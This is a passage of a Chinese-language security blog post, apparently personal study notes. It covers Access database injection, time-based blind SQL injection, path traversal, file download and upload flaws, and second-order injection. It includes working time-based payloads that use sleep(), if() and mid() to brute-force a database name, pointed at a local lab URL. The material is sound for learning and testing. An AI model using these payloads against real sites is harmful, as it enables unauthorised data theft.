+<h2 id="（五）access数据库"><a href="#（五）access数据库" class="headerlink" title="（五）access数据库"></a>（五）access数据库</h2><h3 id="1-特点"><a href="#1-特点" class="headerlink" title="1.特点"></a>1.特点</h3><ul>
+<li>access</li>
+</ul>
+<p>​                 表名</p>
+<p>​                         列明</p>
+<p>​                                 数据</p>
+<ul>
+<li>没有数据库，access就相当于数据库，其他数据库比access要高级</li>
+<li>没有内置方法</li>
+<li>在asp网站中，数据库保存在当前的文件目录下</li>
+</ul>
+<h3 id="2-注入"><a href="#2-注入" class="headerlink" title="2.注入"></a>2.注入</h3><ul>
+<li>只能是猜数据表和字段的名称，通过字典来跑</li>
+</ul>
+<h2 id="（六）盲注（sql本身查询方式insert-update等，或者网站过滤）"><a href="#（六）盲注（sql本身查询方式insert-update等，或者网站过滤）" class="headerlink" title="（六）盲注（sql本身查询方式insert,update等，或者网站过滤）"></a>（六）盲注（sql本身查询方式insert,update等，或者网站过滤）</h2><h3 id="1-基于布尔的逻辑判断"><a href="#1-基于布尔的逻辑判断" class="headerlink" title="1.基于布尔的逻辑判断"></a>1.基于布尔的逻辑判断</h3><h3 id="2-基于时间的延时判断"><a href="#2-基于时间的延时判断" class="headerlink" title="2.基于时间的延时判断"></a>2.基于时间的延时判断</h3><p><strong>if,sleep。if(条件,A,B)条件成立返回A，不成立返回B</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> member <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#根据页面的加载时间判断数据库，不需要回显</span>
+<span class="token comment">#缺点会受到网络速度的影响</span>
+
+<span class="token comment">#判断段数据库的长度，爆破</span>
+<span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> member <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>mid抓取一个字符进行判断，就可以通过暴力破解数据库名mid(srt,a,b)从a位开始，抓取b个</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="3-基于报错的报错错回显"><a href="#3-基于报错的报错错回显" class="headerlink" title="3.基于报错的报错错回显"></a>3.基于报错的报错错回显</h3><h1 id="二-文件操作"><a href="#二-文件操作" class="headerlink" title="二.文件操作"></a>二.文件操作</h1><p><strong>1.跨目录文件的读取</strong></p>
+<p><strong>2.如果读取到数据库配置文件，就会找到用户密码</strong></p>
+<p><strong>3.通过工具扫目录，或者进行目录爬行，有时候读取的文件不会显示，可以通过修改源代码来达成目的</strong></p>
+<p><strong>4.危害，发现目录盘的结构，配合一些操作</strong></p>
+<h2 id="2-1网站文件"><a href="#2-1网站文件" class="headerlink" title="2.1网站文件"></a>2.1网站文件</h2><blockquote>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220411112042.jpeg"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.3.133:88/vul/dir/dir_list.php?title=truman.php">http://192.168.3.133:88/vul/dir/dir_list.php?title=truman.php</a></p>
+<p>①网站域名<a href="http://192.168.3.133:88，文件夹vul/dir，文件dir_list.php，参数名itle，参数值">http://192.168.3.133:88，文件夹vul/dir，文件dir_list.php，参数名itle，参数值</a></p>
+</blockquote>
+<h2 id="2-2文件读取"><a href="#2-2文件读取" class="headerlink" title="2.2文件读取"></a>2.2文件读取</h2><p><strong>获取文件内容，但不可以获取目录结构</strong></p>
+<p><strong>原因为程序员写代码时的不同</strong></p>
+<h2 id="2-3文件上传（高危）"><a href="#2-3文件上传（高危）" class="headerlink" title="2.3文件上传（高危）"></a>2.3文件上传（高危）</h2><p><strong>1.上传文件到网站目录</strong></p>
+<p><strong>2.危害webshell植入后门</strong></p>
+<h2 id="2-4目录遍历"><a href="#2-4目录遍历" class="headerlink" title="2.4目录遍历"></a>2.4目录遍历</h2><h2 id="2-5文件下载"><a href="#2-5文件下载" class="headerlink" title="2.5文件下载"></a>2.5文件下载</h2><p><strong>存在文件下载的漏洞时，查看下载的地址，遍历出文件，通过..\的越级下载东西</strong></p>
+<p><strong>出现在有下载的位置</strong></p>
+<h1 id="三-注入拓展"><a href="#三-注入拓展" class="headerlink" title="三.注入拓展"></a>三.注入拓展</h1><h2 id="3-1-加密注入"><a href="#3-1-加密注入" class="headerlink" title="3.1 加密注入"></a>3.1 加密注入</h2><p>cookie的内容是被加密过的，注入的语句是需要进行相同的加密加密方式进行加密。</p>
+<h2 id="3-2二次注入"><a href="#3-2二次注入" class="headerlink" title="3.2二次注入"></a>3.2二次注入</h2><p><strong>扫描工具一般是没有进行二次注入的，有源代码的测试比较可行。通过代码分析还是人工分析。</strong></p>
+<blockquote>
+<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
+<p><strong>二次注入，可以概括为以下两步:</strong></p>
+<ul>
+<li>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>
+<li>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>
+</ul>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220511231216.webp"></p>
+<ul>
+<li>当输入的参数在前端有长度限制可以在html里面更改，后台限制则不可更改。</li>
+</ul>
+<h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><ul>
+<li>明确漏洞的危害，目的与漏洞有关，漏洞提供什么样的帮助</li>
+<li></li>
+</ul>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">HKini</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.hkini.top/posts/36173.html">https://www.hkini.top/posts/36173.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">HKini</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">
+                                    <span class="chip bg-color">安全攻防</span>
+                                </a>
+                            
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid="></script>
+    <div class="addthis_inline_share_toolbox"></div>
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/valine/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'fYv09ruBQuZf3CmZ2mocNTif-MdYXbMMI',
+        appKey: 'Oead34XGgjgRgu9PBpXkBBQi',
+        serverURLs: 'https://fyv09rub.api.lncldglobal.com',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/59029.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/medias/featureimages/13.jpg" class="responsive-img" alt="文件上传实验">
+                        
+                        <span class="card-title">文件上传实验</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            不同的类型文件上传的方式有所不同，对上传漏洞的分类，对不同的漏洞实行不同的方法可以实现高效率准确的上传。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">
+                        <span class="chip bg-color">安全攻防</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                        <span class="chip bg-color">文件上传</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/64967.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/medias/featureimages/2.jpg" class="responsive-img" alt="CSRF实验">
+                        
+                        <span class="card-title">CSRF实验</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            关于CSRF的实战练习。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CSRF/">
+                        <span class="chip bg-color">CSRF</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">
+                        <span class="chip bg-color">安全攻防</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Redamancy<br />'
+            + '文章作者: HKini<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('2'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    
+<footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="6638358192"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <a href="/about" target="_blank">HKini</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">21k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2022";
+                        var startMonth = "12";
+                        var startDate = "25";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+                <span id="icp"><img src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/medias/icp.png"
+                                    style="vertical-align: text-bottom;"/>
+                <a href="/www.hkini.top" target="_blank">蜀ICP备2023000334号</a>
+            </span>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/togetherhkl" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:hekailin@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1778267485" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1778267485" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
